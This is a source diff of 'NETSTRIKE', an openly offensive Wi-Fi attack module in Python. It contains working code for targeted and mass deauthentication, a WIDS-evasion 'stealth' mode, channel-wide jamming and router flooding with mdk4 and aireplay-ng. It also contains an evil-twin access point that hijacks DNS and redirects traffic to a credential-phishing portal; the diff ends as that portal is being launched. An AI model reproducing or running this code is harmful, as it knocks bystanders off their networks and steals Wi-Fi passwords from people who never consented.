@@ -1,14 +1,18 @@
 #!/usr/bin/env python3
+"""
+NETSTRIKE v4.0 - PHANTOM EDITION
+Attack Module — Deauth, Mass Deauth with Skip, Evil Twin, Router Stress, Beacon Flood
+"""
 
 import os
+import csv
 import time
+import random
 import threading
-import subprocess
 import http.server
 import socketserver
-import requests
-import json
-from typing import List
+from urllib.parse import unquote
+
 
 class AttackManager:
     def __init__(self, core, scanner):
@@ -16,699 +20,897 @@ class AttackManager:
         self.scanner = scanner
         self.attack_processes = []
         self.attack_running = False
-        self.attack_threads = []
         self.evil_twin_running = False
-        self.captured_password = None
         self.phishing_server = None
         self.router_brand = "Generic"
 
-        # OUI Database for brand detection
         self.oui_database = {
-            "C0:25:E9": "TP-Link",
-            "D8:0D:17": "TP-Link", 
-            "A0:04:60": "Netgear",
-            "2C:B0:5D": "Netgear",
-            "F8:8F:CA": "Google Fiber",
-            "B0:4E:26": "Linksys",
-            "00:1B:2F": "ASUS",
-            "00:1D:60": "ASUS",
-            "00:24:B2": "Belkin",
-            "00:1A:2B": "D-Link",
-            "00:1C:F0": "D-Link",
-            "00:26:5A": "Cisco",
-            "00:1E:7E": "Huawei",
-            "00:1E:74": "Huawei",
-            "00:1A:11": "Zyxel",
-            "00:14:D1": "Zyxel"
+            "C0:25:E9": "TP-Link",  "D8:0D:17": "TP-Link",
+            "50:C7:BF": "TP-Link",  "EC:08:6B": "TP-Link",
+            "A0:04:60": "Netgear",  "2C:B0:5D": "Netgear",
+            "9C:3D:CF": "Netgear",  "F8:8F:CA": "Google",
+            "B0:4E:26": "Linksys",  "00:18:F8": "Linksys",
+            "00:1B:2F": "ASUS",     "00:1D:60": "ASUS",
+            "AC:84:C6": "ASUS",     "50:46:5D": "ASUS",
+            "00:24:B2": "Belkin",   "94:44:52": "Belkin",
+            "00:1A:2B": "D-Link",   "00:1C:F0": "D-Link",
+            "B0:C5:54": "D-Link",   "1C:7E:E5": "D-Link",
+            "00:26:5A": "Cisco",    "00:1E:BD": "Cisco",
+            "00:1E:7E": "Huawei",   "48:46:FB": "Huawei",
+            "18:A6:F7": "Tenda",    "C8:3A:35": "Tenda",
+            "00:1A:11": "Zyxel",    "00:14:D1": "Zyxel",
         }
 
-    def detect_router_brand(self, bssid):
-        """Detect router brand from BSSID OUI"""
-        oui_prefix = bssid.upper()[:8]  # First 6 chars + colon
-        return self.oui_database.get(oui_prefix, "Generic")
+    def _brand(self, bssid):
+        return self.oui_database.get(bssid.upper()[:8], "Generic")
+
+    def _safe_channel(self, target):
+        try:
+            return int(target['channel'])
+        except (ValueError, KeyError):
+            return 6
+
+    def _set_interface_ip(self, iface, ip="192.168.1.1", mask="255.255.255.0"):
+        """Set IP on interface — tries ip(iproute2) then falls back to ifconfig."""
+        cidr = "24"
+        self.core.run_command(f"ip addr flush dev {iface} 2>/dev/null")
+        r = self.core.run_command(f"ip addr add {ip}/{cidr} dev {iface} 2>/dev/null")
+        if not r or r.returncode != 0:
+            self.core.run_command(f"ifconfig {iface} {ip} netmask {mask} up 2>/dev/null")
+        self.core.run_command(f"ip link set {iface} up 2>/dev/null")
+
+    # ═══════════════════════════════════════════════
+    # 1. SINGLE TARGET DEAUTH
+    # ═══════════════════════════════════════════════
 
     def single_target_attack(self):
-        """Professional Single Target Attack - DUAL ENGINE"""
-        print("\033[1;36m[→] Professional target acquisition...\033[0m")
-        
-        # Always fresh scan
-        if self.scanner.wifi_scan():
-            self.scanner.display_scan_results()
-            target = self.scanner.select_target()
-            
-            if target:
-                print(f"\033[1;31m[💣] Professional attack: {target['essid']}\033[0m")
-                self.start_professional_single_attack(target)
+        if not self.scanner.wifi_scan():
+            return
+        self.scanner.display_scan_results()
+        target = self.scanner.select_target()
+        if not target:
+            return
 
-    def start_professional_single_attack(self, target):
-        """Professional targeted attack with client mapping"""
-        self.core.set_current_operation("SINGLE_TARGET_ATTACK")
+        print("\n\033[1;35m┌─ Attack Mode ───────────────────────────────┐\033[0m")
+        print("\033[1;35m│  1) NORMAL   Maximum power, fastest kill      │\033[0m")
+        print("\033[1;35m│  2) STEALTH  Low rate, evades basic WIDS      │\033[0m")
+        print("\033[1;35m└──────────────────────────────────────────────┘\033[0m")
+        stealth = input("\033[1;36m[?] Mode (1/2): \033[0m").strip() == "2"
+
+        self.core.set_current_operation("SINGLE_DEAUTH")
         self.attack_running = True
-        
-        # Set target channel
-        self.core.run_command(f"iwconfig {self.core.mon_interface} channel {target['channel']}")
-        
-        print("\033[1;31m[⚡] Deploying professional attack vectors...\033[0m")
-        
-        # PHASE 1: Client Mapping
-        print("\033[1;31m[🔍] Phase 1: Client reconnaissance...\033[0m")
-        client_map_file = f"/tmp/client_map_{target['bssid'].replace(':', '')}"
-        
-        # Start background client detection
-        client_proc = self.core.run_command(
-            f"airodump-ng --bssid {target['bssid']} -c {target['channel']} -w {client_map_file} --output-format csv {self.core.mon_interface} > /dev/null 2>&1 &",
-            background=True
-        )
-        time.sleep(8)  # Allow time for client discovery
-        
-        # PHASE 2: Dual-Engine Attack
-        print("\033[1;31m[💣] Phase 2: Dual-engine kinetic strike...\033[0m")
-        
-        # Engine A: Broadcast Deauth
-        print("\033[1;31m[🔧] VECTOR A: Broadcast disruption\033[0m")
-        proc1 = self.core.run_command(
-            f"aireplay-ng --deauth 0 -a {target['bssid']} {self.core.mon_interface} > /tmp/broadcast_deauth.log 2>&1 &",
-            background=True
-        )
-        if proc1:
-            self.attack_processes.append(proc1)
-            self.core.add_attack_process(proc1)
-        
-        # Engine B: Targeted Client Deauth
-        print("\033[1;31m[🔧] VECTOR B: Targeted client elimination\033[0m")
-        
-        # Get clients from the scan
-        target_clients = [c for c, info in self.scanner.clients.items() 
-                         if info.get('bssid') == target['bssid']]
-        
-        if target_clients:
-            print(f"\033[1;31m[🎯] Targeting {len(target_clients)} connected clients\033[0m")
-            
-            # Create targeted deauth script
-            deauth_script = f"/tmp/targeted_deauth_{target['bssid'].replace(':', '')}.sh"
-            with open(deauth_script, 'w') as f:
-                f.write("#!/bin/bash\n")
-                for client_mac in target_clients:
-                    f.write(f"aireplay-ng --deauth 10 -a {target['bssid']} -c {client_mac} {self.core.mon_interface} > /dev/null 2>&1 &\n")
-                f.write("wait\n")
-            
-            os.chmod(deauth_script, 0o755)
-            proc2 = self.core.run_command(f"bash {deauth_script} > /tmp/targeted_deauth.log 2>&1 &", background=True)
-            if proc2:
-                self.attack_processes.append(proc2)
-                self.core.add_attack_process(proc2)
-        else:
-            print("\033[1;33m[⚠️] No clients detected - using aggressive broadcast\033[0m")
-            # Fallback to MDK4 for better broadcast effectiveness
-            proc2 = self.core.run_command(
-                f"mdk4 {self.core.mon_interface} d -c {target['channel']} -B {target['bssid']} > /tmp/mdk4_attack.log 2>&1 &",
+        self._run_single_deauth(target, stealth)
+        self.core.clear_current_operation()
+
+    def _run_single_deauth(self, target, stealth):
+        bssid   = target['bssid']
+        channel = self._safe_channel(target)
+        essid   = target['essid']
+        mon     = self.core.mon_interface
+
+        # Lock channel
+        self.core.run_command(f"iwconfig {mon} channel {channel} 2>/dev/null")
+        time.sleep(0.3)
+
+        if stealth:
+            print(f"\033[1;35m[👻] STEALTH DEAUTH: {essid}  (low-rate, variable timing)\033[0m")
+
+            p1 = self.core.run_command(
+                f"mdk4 {mon} d -B {bssid} -c {channel} -s 30",
                 background=True
             )
-            if proc2:
-                self.attack_processes.append(proc2)
-                self.core.add_attack_process(proc2)
-        
-        # Cleanup client mapping
-        if client_proc:
-            client_proc.terminate()
-        
-        print(f"\033[1;32m[✅] {len(self.attack_processes)} professional vectors deployed\033[0m")
-        print(f"\033[1;31m[💥] Target {target['essid']} under complete network blackout!\033[0m")
-        
-        # Professional attack animation
-        anim_thread = threading.Thread(target=self.show_professional_attack_animation, args=(target['essid'],))
-        anim_thread.daemon = True
-        anim_thread.start()
-        
-        print("\033[1;33m[⏹️] Press Enter to stop professional attack...\033[0m")
+            if p1:
+                self.attack_processes.append(p1)
+                self.core.add_attack_process(p1)
+
+            threading.Thread(
+                target=self._stealth_burst_loop, args=(bssid, mon), daemon=True
+            ).start()
+
+        else:
+            print(f"\033[1;31m[💥] PHANTOM ENGINE: Full-power deauth → {essid}\033[0m")
+
+            # Engine 1: aireplay broadcast
+            p1 = self.core.run_command(
+                f"aireplay-ng --deauth 0 -a {bssid} {mon}",
+                background=True
+            )
+            # Engine 2: MDK4 fills gaps
+            p2 = self.core.run_command(
+                f"mdk4 {mon} d -B {bssid} -c {channel}",
+                background=True
+            )
+            for p in [p1, p2]:
+                if p:
+                    self.attack_processes.append(p)
+                    self.core.add_attack_process(p)
+
+            # Engine 3: per-client targeted
+            threading.Thread(
+                target=self._discover_and_deauth_clients,
+                args=(target,), daemon=True
+            ).start()
+
+        threading.Thread(
+            target=self._anim_single, args=(essid, stealth), daemon=True
+        ).start()
+
+        print("\033[1;33m[⏹] Press Enter to stop...\033[0m")
         input()
-        
         self.stop_attacks()
+        print("\033[1;32m[✓] Attack terminated\033[0m")
+
+    def _stealth_burst_loop(self, bssid, mon):
+        """Random-interval aireplay bursts — low WIDS fingerprint"""
+        while self.attack_running:
+            count = random.randint(2, 5)
+            self.core.run_command(
+                f"aireplay-ng --deauth {count} -a {bssid} {mon} > /dev/null 2>&1"
+            )
+            time.sleep(random.uniform(1.5, 4.5))
+
+    def _discover_and_deauth_clients(self, target):
+        """Capture brief CSV, parse associated clients, launch per-client deauth"""
+        bssid   = target['bssid']
+        channel = self._safe_channel(target)
+        mon     = self.core.mon_interface
+        tmp     = f"/tmp/ns_cl_{bssid.replace(':', '')}"
+
+        proc = self.core.run_command(
+            f"airodump-ng --bssid {bssid} -c {channel} "
+            f"-w {tmp} --output-format csv {mon}",
+            background=True
+        )
+        time.sleep(8)
+        if proc:
+            try:
+                proc.terminate()
+            except Exception:
+                pass
+
+        clients = self._parse_clients_from_csv(f"{tmp}-01.csv", bssid)
+        if not clients:
+            return
+
+        print(f"\033[1;31m\n[🎯] Engine 3: targeting {len(clients)} clients\033[0m")
+        for mac in clients:
+            if not self.attack_running:
+                break
+            p = self.core.run_command(
+                f"aireplay-ng --deauth 0 -a {bssid} -c {mac} {mon}",
+                background=True
+            )
+            if p:
+                self.attack_processes.append(p)
+                self.core.add_attack_process(p)
+
+    def _parse_clients_from_csv(self, csv_file, target_bssid):
+        clients = []
+        if not os.path.exists(csv_file):
+            return clients
+        try:
+            with open(csv_file, 'r', encoding='utf-8', errors='replace') as f:
+                content = f.readlines()
+            in_clients = False
+            for line in content:
+                if "Station MAC" in line:
+                    in_clients = True
+                    continue
+                if not in_clients or not line.strip():
+                    continue
+                for row in csv.reader([line]):
+                    if len(row) >= 6:
+                        mac   = row[0].strip()
+                        assoc = row[5].strip()
+                        if len(mac) == 17 and mac.count(':') == 5 and assoc == target_bssid:
+                            clients.append(mac)
+        except Exception:
+            pass
+        return clients
+
+    # ═══════════════════════════════════════════════
+    # 2. MASS DEAUTH WITH SKIP
+    # ═══════════════════════════════════════════════
+
+    def mass_deauth_with_skip(self):
+        """Scan everything, user picks networks to protect, attack the rest"""
+        print("\033[1;31m[🌐] Mass Deauth — PHANTOM PROTOCOL\033[0m")
+
+        if not self.scanner.wifi_scan(20):
+            return
+        if not self.scanner.networks:
+            print("\033[1;31m[✘] No networks found\033[0m")
+            return
+
+        self.scanner.display_scan_results()
+
+        sorted_nets = sorted(
+            self.scanner.networks.items(),
+            key=lambda x: int(x[1]['power']) if x[1]['power'].lstrip('-').isdigit() else 0,
+            reverse=True
+        )
+
+        total = len(sorted_nets)
+        print(f"\n\033[1;33m[!] {total} networks found\033[0m")
+        print("\033[1;36m[?] Enter numbers to SKIP (comma-separated, e.g. 1,3,5) or Enter to attack ALL:\033[0m")
+        raw = input("\033[1;36m[?] Skip: \033[0m").strip()
+
+        skip_bssids = set()
+        if raw:
+            try:
+                for part in raw.split(','):
+                    idx = int(part.strip()) - 1
+                    if 0 <= idx < total:
+                        net = sorted_nets[idx][1]
+                        skip_bssids.add(net['bssid'])
+                        print(f"\033[1;32m[✓] Skipping: {net['essid']} ({net['bssid']})\033[0m")
+            except ValueError:
+                print("\033[1;33m[!] Invalid input — attacking all\033[0m")
+
+        attack_count = total - len(skip_bssids)
+        print(f"\033[1;31m[🎯] Will attack {attack_count} network(s)\033[0m")
+
+        confirm = input("\033[1;31m[?] Confirm? (y/N): \033[0m").strip().lower()
+        if confirm not in ['y', 'yes']:
+            print("\033[1;33m[✘] Cancelled\033[0m")
+            return
+
+        print("\n\033[1;35m┌─ Attack Mode ───────────────────────────────┐\033[0m")
+        print("\033[1;35m│  1) NORMAL   Max power                        │\033[0m")
+        print("\033[1;35m│  2) STEALTH  Low rate, variable timing        │\033[0m")
+        print("\033[1;35m└──────────────────────────────────────────────┘\033[0m")
+        stealth = input("\033[1;36m[?] Mode (1/2): \033[0m").strip() == "2"
+
+        self.core.set_current_operation("MASS_DEAUTH")
+        self.attack_running = True
+        self._run_mass_deauth(skip_bssids, stealth, sorted_nets)
         self.core.clear_current_operation()
-        print("\033[1;32m[✅] Professional attack terminated\033[0m")
+
+    def _run_mass_deauth(self, skip_bssids, stealth, sorted_nets):
+        mon = self.core.mon_interface
+
+        target_nets = [net for _, net in sorted_nets if net['bssid'] not in skip_bssids]
+        if not target_nets:
+            print("\033[1;31m[✘] No targets after skip\033[0m")
+            return
+
+        # MDK4 blacklist
+        bl_file = "/tmp/ns_bl.txt"
+        with open(bl_file, 'w') as f:
+            for bssid in skip_bssids:
+                f.write(bssid + '\n')
+
+        channels = set()
+        for net in target_nets:
+            try:
+                channels.add(int(net['channel']))
+            except ValueError:
+                pass
+        ch_str = ','.join(str(c) for c in sorted(channels))
+
+        speed = 30 if stealth else 1000
+        label = "STEALTH MASS" if stealth else "PHANTOM MASS"
+        print(f"\033[1;31m[💥] {label} DEAUTH: {len(target_nets)} targets  |  ch: {ch_str}\033[0m")
+
+        mdk4_cmd = f"mdk4 {mon} d"
+        if skip_bssids:
+            mdk4_cmd += f" -b {bl_file}"
+        if ch_str:
+            mdk4_cmd += f" -c {ch_str}"
+        if stealth:
+            mdk4_cmd += f" -s {speed}"
+
+        p = self.core.run_command(f"{mdk4_cmd}", background=True)
+        if p:
+            self.attack_processes.append(p)
+            self.core.add_attack_process(p)
+
+        # Per-target aireplay threads (top 8 by signal)
+        for net in target_nets[:8]:
+            threading.Thread(
+                target=self._continuous_deauth_thread,
+                args=(net, stealth), daemon=True
+            ).start()
+
+        threading.Thread(
+            target=self._anim_mass, args=(len(target_nets), stealth), daemon=True
+        ).start()
+
+        print("\033[1;33m[⏹] Press Enter to stop mass deauth...\033[0m")
+        input()
+        self.stop_attacks()
+        print("\033[1;32m[✓] Mass deauth terminated\033[0m")
+
+    def _continuous_deauth_thread(self, net, stealth):
+        bssid = net['bssid']
+        mon   = self.core.mon_interface
+        count = "3" if stealth else "0"
+        while self.attack_running:
+            self.core.run_command(
+                f"aireplay-ng --deauth {count} -a {bssid} {mon} > /dev/null 2>&1"
+            )
+            if stealth:
+                time.sleep(random.uniform(2.0, 5.0))
+            else:
+                time.sleep(0.1)
+
+    # ═══════════════════════════════════════════════
+    # 3. FULL SPECTRUM JAMMING
+    # ═══════════════════════════════════════════════
 
     def mass_destruction(self):
-        """Professional Mass Network Disruption - CHANNEL AGGREGATION"""
-        print("\033[1;31m[🌐] Professional mass disruption protocol...\033[0m")
-        
-        # Always fresh scan
-        if self.scanner.wifi_scan():
-            target_count = len(self.scanner.networks)
-            
-            if target_count == 0:
-                print("\033[1;31m[✘] No professional targets found\033[0m")
-                return
-            
-            print(f"\033[1;33m[🎯] Professional targeting: {target_count} networks\033[0m")
-            
-            confirm = input("\033[1;31m[?] Confirm professional disruption? (y/N): \033[0m")
-            
-            if confirm.lower() in ['y', 'yes']:
-                self.core.set_current_operation("MASS_DESTRUCTION")
-                self.attack_running = True
-                
-                print("\033[1;31m[⚡] Deploying professional disruption...\033[0m")
-                
-                # Extract unique channels for aggregation
-                unique_channels = set()
-                for target in self.scanner.networks.values():
-                    try:
-                        unique_channels.add(target['channel'])
-                    except:
-                        continue
-                
-                if unique_channels:
-                    channel_list = ','.join(str(ch) for ch in unique_channels)
-                    print(f"\033[1;31m[🎯] Channel aggregation: {channel_list}\033[0m")
-                    
-                    # Single MDK4 process for all channels
-                    print("\033[1;31m[💣] Deploying channel-wide disruption...\033[0m")
-                    mdk4_proc = self.core.run_command(
-                        f"mdk4 {self.core.mon_interface} d -c {channel_list} > /tmp/mdk4_mass_disruption.log 2>&1 &",
-                        background=True
-                    )
-                    
-                    if mdk4_proc:
-                        self.attack_processes.append(mdk4_proc)
-                        self.core.add_attack_process(mdk4_proc)
-                        print(f"\033[1;32m[✅] Professional mass disruption active!\033[0m")
-                        
-                        # Professional animation
-                        anim_thread = threading.Thread(target=self.show_mass_attack_animation)
-                        anim_thread.daemon = True
-                        anim_thread.start()
-                        
-                        print("\033[1;33m[⏹️] Press Enter to stop professional disruption...\033[0m")
-                        input()
-                
-                self.stop_attacks()
-                self.core.clear_current_operation()
-                print("\033[1;32m[✅] Professional disruption terminated\033[0m")
-            else:
-                print("\033[1;33m[❌] Professional disruption cancelled\033[0m")
-
-    def router_destroyer(self):
-        """Professional Router Stress Test - HARDWARE STRESS + PHANTOM MODE"""
-        print("\033[1;31m[💀] Professional router assessment...\033[0m")
-        
-        confirm1 = input("\033[1;31m[?] Type 'STRESS' to confirm: \033[0m")
-        if confirm1.lower() != 'stress':
-            print("\033[1;33m[❌] Professional test cancelled\033[0m")
+        if not self.scanner.wifi_scan():
             return
-            
-        confirm2 = input("\033[1;31m[?] Type 'CONFIRM' to proceed: \033[0m")
-        if confirm2.lower() != 'confirm':
-            print("\033[1;33m[❌] Professional test cancelled\033[0m")
-            return
-        
-        # Always fresh scan
-        if self.scanner.wifi_scan():
-            self.scanner.display_scan_results()
-            target = self.scanner.select_target()
-            
-            if target:
-                print(f"\033[1;31m[💀] Professional stress test: {target['essid']}\033[0m")
-                self.start_professional_router_stress(target)
 
-    def start_professional_router_stress(self, target):
-        """Start professional router stress test with PHANTOM MODE"""
-        self.core.set_current_operation("ROUTER_STRESS_TEST")
+        count = len(self.scanner.networks)
+        if count == 0:
+            print("\033[1;31m[✘] No networks found\033[0m")
+            return
+
+        print(f"\033[1;33m[🎯] {count} networks in range\033[0m")
+        confirm = input("\033[1;31m[?] Launch full-spectrum jamming? (y/N): \033[0m").strip().lower()
+        if confirm not in ['y', 'yes']:
+            print("\033[1;33m[✘] Cancelled\033[0m")
+            return
+
+        channels = set()
+        for net in self.scanner.networks.values():
+            try:
+                channels.add(int(net['channel']))
+            except ValueError:
+                pass
+        ch_str = ','.join(str(c) for c in sorted(channels))
+
+        self.core.set_current_operation("FULL_JAMMING")
         self.attack_running = True
-        
-        print("\033[1;31m[⚡] Professional stress vectors...\033[0m")
-        
-        # Set target channel
-        self.core.run_command(f"iwconfig {self.core.mon_interface} channel {target['channel']}")
-        
-        # Professional stress vectors
-        print("\033[1;31m[🔧] VECTOR 1: Authentication Flood\033[0m")
-        proc1 = self.core.run_command(
-            f"mdk4 {self.core.mon_interface} a -a {target['bssid']} -m > /tmp/auth_flood.log 2>&1 &",
+
+        print(f"\033[1;31m[💥] Full-spectrum jamming: ch {ch_str}\033[0m")
+        p = self.core.run_command(
+            f"mdk4 {self.core.mon_interface} d -c {ch_str}",
             background=True
         )
-        if proc1:
-            self.attack_processes.append(proc1)
-            self.core.add_attack_process(proc1)
-        
-        print("\033[1;31m[🔧] VECTOR 2: EAPOL Flood\033[0m")
-        proc2 = self.core.run_command(
-            f"mdk4 {self.core.mon_interface} x -t {target['bssid']} -n {target['essid']} > /tmp/eapol_flood.log 2>&1 &",
-            background=True
-        )
-        if proc2:
-            self.attack_processes.append(proc2)
-            self.core.add_attack_process(proc2)
-        
-        print("\033[1;31m[🔧] VECTOR 3: Deauth Storm\033[0m")
-        proc3 = self.core.run_command(
-            f"while true; do aireplay-ng --deauth 100 -a {target['bssid']} {self.core.mon_interface} > /tmp/deauth_storm.log 2>&1; sleep 1; done &",
-            background=True
-        )
-        if proc3:
-            self.attack_processes.append(proc3)
-            self.core.add_attack_process(proc3)
-        
-        # PHANTOM MODE: Beacon Flood to overwhelm devices
-        print("\033[1;31m[👻] VECTOR 4: PHANTOM MODE - Beacon Flood\033[0m")
-        proc4 = self.core.run_command(
-            f"mdk4 {self.core.mon_interface} b -c {target['channel']} -s 1000 > /tmp/beacon_flood.log 2>&1 &",
-            background=True
-        )
-        if proc4:
-            self.attack_processes.append(proc4)
-            self.core.add_attack_process(proc4)
-        
-        print(f"\033[1;32m[✅] Professional stress test active\033[0m")
-        print(f"\033[1;31m[💥] Router {target['essid']} under hardware stress!\033[0m")
-        print(f"\033[1;31m[👻] PHANTOM MODE: Overwhelming devices with fake networks!\033[0m")
-        
-        # Stress animation
-        anim_thread = threading.Thread(target=self.show_router_stress_animation)
-        anim_thread.daemon = True
-        anim_thread.start()
-        
-        print("\033[1;33m[⏹️] Press Enter to stop professional stress test...\033[0m")
+        if p:
+            self.attack_processes.append(p)
+            self.core.add_attack_process(p)
+
+        threading.Thread(
+            target=self._anim_mass, args=(count, False), daemon=True
+        ).start()
+
+        print("\033[1;33m[⏹] Press Enter to stop...\033[0m")
         input()
-        
         self.stop_attacks()
         self.core.clear_current_operation()
-        print("\033[1;32m[✅] Professional stress test terminated\033[0m")
+        print("\033[1;32m[✓] Jamming terminated\033[0m")
+
+    # ═══════════════════════════════════════════════
+    # 4. ROUTER STRESS TEST
+    # ═══════════════════════════════════════════════
+
+    def router_destroyer(self):
+        if input("\033[1;31m[?] Type 'STRESS' to confirm: \033[0m").strip().lower() != 'stress':
+            print("\033[1;33m[✘] Cancelled\033[0m")
+            return
+        if input("\033[1;31m[?] Type 'CONFIRM' to proceed: \033[0m").strip().lower() != 'confirm':
+            print("\033[1;33m[✘] Cancelled\033[0m")
+            return
+
+        if not self.scanner.wifi_scan():
+            return
+        self.scanner.display_scan_results()
+        target = self.scanner.select_target()
+        if not target:
+            return
+
+        bssid   = target['bssid']
+        channel = self._safe_channel(target)
+        essid   = target['essid']
+        mon     = self.core.mon_interface
+
+        self.core.set_current_operation("ROUTER_STRESS")
+        self.attack_running = True
+
+        self.core.run_command(f"iwconfig {mon} channel {channel} 2>/dev/null")
+
+        vectors = [
+            (f"mdk4 {mon} a -a {bssid} -m",                           "Auth Flood"),
+            (f"mdk4 {mon} x -t {bssid} -n {essid}",                   "EAPOL Flood"),
+            (f"mdk4 {mon} b -c {channel} -s 1000",                    "Beacon Flood"),
+            (f"aireplay-ng --deauth 0 -a {bssid} {mon}",              "Deauth Storm"),
+            (f"mdk4 {mon} d -B {bssid} -c {channel}",                 "MDK4 Deauth"),
+            (f"aireplay-ng --fakeauth 0 -a {bssid} {mon}",            "Fake Auth"),
+        ]
+
+        for cmd, name in vectors:
+            p = self.core.run_command(cmd, background=True)
+            if p:
+                self.attack_processes.append(p)
+                self.core.add_attack_process(p)
+            print(f"\033[1;31m[🔧] {name}: ACTIVE\033[0m")
+
+        threading.Thread(target=self._anim_stress, daemon=True).start()
+        print("\033[1;33m[⏹] Press Enter to stop...\033[0m")
+        input()
+        self.stop_attacks()
+        self.core.clear_current_operation()
+        print("\033[1;32m[✓] Stress test terminated\033[0m")
+
+    # ═══════════════════════════════════════════════
+    # 5. EVIL TWIN — CHAMELEON ENGINE
+    # ═══════════════════════════════════════════════
 
     def advanced_evil_twin(self):
-        """Professional Access Point Replication - CHAMELEON ENGINE"""
-        print("\033[1;36m[→] Professional AP replication protocol...\033[0m")
-        
-        # Always fresh scan
-        if self.scanner.wifi_scan():
-            self.scanner.display_scan_results()
-            target = self.scanner.select_target()
-            
-            if target:
-                # Detect router brand for targeted phishing
-                self.router_brand = self.detect_router_brand(target['bssid'])
-                print(f"\033[1;34m[🎭] CHAMELEON ENGINE: Detected {self.router_brand} router\033[0m")
-                print(f"\033[1;34m[👥] Professional replication: {target['essid']}\033[0m")
-                
-                # First capture handshake for verification
-                print("\033[1;36m[→] Phase 1: Capturing handshake for verification...\033[0m")
-                if self.capture_handshake_for_evil_twin(target):
-                    self.start_professional_open_ap(target)
-                else:
-                    print("\033[1;31m[✘] Handshake capture failed - cannot proceed with verification\033[0m")
+        if not self.scanner.wifi_scan():
+            return
+        self.scanner.display_scan_results()
+        target = self.scanner.select_target()
+        if not target:
+            return
 
-    def capture_handshake_for_evil_twin(self, target):
-        """Capture handshake for evil twin verification"""
-        print("\033[1;36m[→] Starting handshake capture...\033[0m")
-        
-        handshake_file = f"/tmp/evil_twin_handshake_{target['bssid'].replace(':', '')}"
-        
-        # Start handshake capture
-        capture_proc = self.core.run_command(
-            f"airodump-ng -c {target['channel']} --bssid {target['bssid']} -w {handshake_file} {self.core.mon_interface} > /dev/null 2>&1 &",
+        self.router_brand = self._brand(target['bssid'])
+        print(f"\033[1;34m[🎭] CHAMELEON: {self.router_brand} theme detected\033[0m")
+
+        hs_file = None
+        cap = input("\033[1;36m[?] Capture handshake for password verification? (y/N): \033[0m").strip().lower()
+        if cap in ['y', 'yes']:
+            hs_file = self._capture_handshake(target)
+            if not hs_file:
+                print("\033[1;33m[!] No handshake — proceeding without verification\033[0m")
+
+        self._start_evil_twin(target, hs_file)
+
+    def _capture_handshake(self, target):
+        out   = f"/tmp/ns_twin_{target['bssid'].replace(':', '')}"
+        cap_p = self.core.run_command(
+            f"airodump-ng -c {target['channel']} --bssid {target['bssid']} "
+            f"-w {out} {self.core.mon_interface}",
             background=True
         )
-        
-        # Start deauth to force handshake
-        deauth_proc = self.core.run_command(
-            f"aireplay-ng --deauth 10 -a {target['bssid']} {self.core.mon_interface} > /dev/null 2>&1 &",
+        deauth_p = self.core.run_command(
+            f"aireplay-ng --deauth 10 -a {target['bssid']} {self.core.mon_interface}",
             background=True
         )
-        
-        print("\033[1;36m[⏱️] Capturing handshake for 30 seconds...\033[0m")
+        print("\033[1;36m[⏱] Capturing handshake (30 s)...\033[0m")
         time.sleep(30)
-        
-        # Stop capture
-        if capture_proc:
-            capture_proc.terminate()
-        if deauth_proc:
-            deauth_proc.terminate()
-        
-        # Check if handshake was captured
-        cap_file = f"{handshake_file}-01.cap"
-        if os.path.exists(cap_file) and self.check_handshake(cap_file, target['bssid']):
-            print("\033[1;32m[✅] Handshake captured for verification\033[0m")
-            return True
-        else:
-            print("\033[1;31m[✘] Handshake capture failed\033[0m")
-            return False
+        for p in [cap_p, deauth_p]:
+            if p:
+                try:
+                    p.terminate()
+                except Exception:
+                    pass
 
-    def check_handshake(self, cap_file, bssid):
-        """Check if handshake is valid"""
-        result = self.core.run_command(f"aircrack-ng {cap_file} 2>/dev/null | grep '{bssid}'")
-        return result and "1 handshake" in result.stdout
-
-    def start_professional_open_ap(self, target):
-        """Start professional open AP with CHAMELEON ENGINE"""
-        try:
-            self.core.set_current_operation("AP_REPLICATION")
-            self.evil_twin_running = True
-            
-            print("\033[1;36m[→] Professional Open AP deployment...\033[0m")
-            
-            # Stop NetworkManager
-            self.core.run_command("systemctl stop NetworkManager >/dev/null 2>&1")
-            time.sleep(2)
-            
-            # Set channel
-            self.core.run_command(f"iwconfig {self.core.mon_interface} channel {target['channel']}")
-            
-            # Professional OPEN AP configuration (no password)
-            hostapd_conf = f"""
-interface={self.core.mon_interface}
-driver=nl80211
-ssid={target['essid']}
-channel={target['channel']}
-hw_mode=g
-auth_algs=1
-ignore_broadcast_ssid=0
-wpa=0
-"""
-            
-            with open("/tmp/pro_open_ap.conf", "w") as f:
-                f.write(hostapd_conf)
-            
-            # Enhanced dnsmasq configuration with OS-specific captive portals
-            dnsmasq_conf = f"""
-interface={self.core.mon_interface}
-dhcp-range=192.168.1.100,192.168.1.200,255.255.255.0,12h
-dhcp-option=3,192.168.1.1
-dhcp-option=6,8.8.8.8
-# Apple Captive Portal Triggers
-address=/captive.apple.com/192.168.1.1
-address=/www.apple.com/192.168.1.1
-address=/ibarrel.com/192.168.1.1
-# Android Captive Portal Triggers  
-address=/connectivitycheck.gstatic.com/192.168.1.1
-address=/connectivitycheck.android.com/192.168.1.1
-address=/clients3.google.com/192.168.1.1
-# Windows Captive Portal Triggers
-address=/www.msftncsi.com/192.168.1.1
-address=/ipv6.msftncsi.com/192.168.1.1
-# Generic fallback
-address=/#/192.168.1.1
-log-queries
-log-dhcp
-"""
-            
-            with open("/tmp/pro_dnsmasq.conf", "w") as f:
-                f.write(dnsmasq_conf)
-            
-            # Configure interface and enable IP forwarding
-            self.core.run_command(f"ifconfig {self.core.mon_interface} 192.168.1.1 netmask 255.255.255.0 up")
-            self.core.run_command("echo 1 > /proc/sys/net/ipv4/ip_forward")
-            self.core.run_command("iptables --flush")
-            self.core.run_command("iptables -t nat --flush")
-            self.core.run_command("iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 80")
-            self.core.run_command("iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-port 80")
-            
-            # Start professional services
-            print("\033[1;36m[→] Starting professional services...\033[0m")
-            dnsmasq_proc = self.core.run_command("dnsmasq -C /tmp/pro_dnsmasq.conf", background=True)
-            if dnsmasq_proc:
-                self.attack_processes.append(dnsmasq_proc)
-                self.core.add_attack_process(dnsmasq_proc)
-            
-            hostapd_proc = self.core.run_command("hostapd /tmp/pro_open_ap.conf", background=True)
-            if hostapd_proc:
-                self.attack_processes.append(hostapd_proc)
-                self.core.add_attack_process(hostapd_proc)
-            
-            time.sleep(5)
-            
-            # Start CHAMELEON phishing web server
-            print("\033[1;36m[→] Starting CHAMELEON verification web server...\033[0m")
-            web_thread = threading.Thread(target=self.start_chameleon_phishing_server, args=(target,))
-            web_thread.daemon = True
-            web_thread.start()
-            
